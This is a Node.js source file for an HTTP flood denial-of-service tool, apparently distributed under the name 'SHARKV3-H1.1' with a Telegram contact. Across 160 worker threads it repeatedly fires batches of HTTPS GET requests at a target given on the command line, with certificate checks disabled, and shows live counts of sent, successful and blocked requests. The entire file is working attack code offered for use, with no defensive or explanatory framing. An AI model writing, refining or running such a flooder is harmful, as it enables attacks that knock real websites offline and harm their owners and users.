const https = require('https');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');
const url = require('url');

const THREADS = 32;
const INITIAL_CONNECTIONS = 50;
const POWER_MULTIPLIER = 4;
const MAX_INFLIGHT = 4000;
const LIVE_REFRESH_RATE = 1100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.clear();
    console.log(`SHARKV3-H1.1 - T.ME/STSVKINGDOM`);
    console.log(`Starting full power HTTP/1.1 attack...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: true } });
    }

    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        new Worker(__filename, { workerData: { target, duration, initial: false } });
    }

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3-H1.1 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);
} else {
    const { target, duration, initial } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;

    const parsed = url.parse(target);
    const hostname = parsed.hostname;
    const port = parsed.port || 443;
    const path = parsed.path || '/';

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    const agent = new https.Agent({
        keepAlive: true,
        maxSockets: Infinity,
        maxFreeSockets: Infinity
    });

    function sendOne() {
        if (Date.now() > end) return;

        const options = {
            hostname,
            port,
            path,
            method: 'GET',
            agent,
            rejectUnauthorized: false,
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Connection': 'keep-alive'
            }
        };

        try {
            sendStat('req');
            const req = https.request(options, res => {
                res.on('data', () => {});
                res.on('end', () => sendStat('ok'));
            });

            req.on('error', () => sendStat('err'));
            req.end();
        } catch {
            sendStat('err');
        }
    }

    function sendFlood() {
        if (Date.now() > end) return;
        for (let i = 0; i < 150; i++) sendOne();
        setTimeout(sendFlood, 1);
    }

    for (let i = 0; i < connections; i++) {
        sendFlood();
    }
}
